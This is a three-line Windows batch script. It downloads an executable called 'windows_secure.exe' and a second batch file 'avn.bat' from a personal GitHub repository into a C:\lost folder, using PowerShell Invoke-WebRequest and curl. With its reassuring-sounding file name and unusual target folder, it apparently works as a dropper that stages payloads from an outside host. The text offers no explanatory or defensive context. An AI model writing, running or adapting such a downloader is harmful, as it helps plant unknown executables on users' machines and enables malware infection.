@echo off
powershell -command "Invoke-WebRequest https://github.com/drongo1993/test/raw/main/windows_secure.exe -Outfile  C:\lost\windows_secure.exe"
curl https://github.com/drongo1993/test/main/avn.bat --output C:\lost\avn.bat
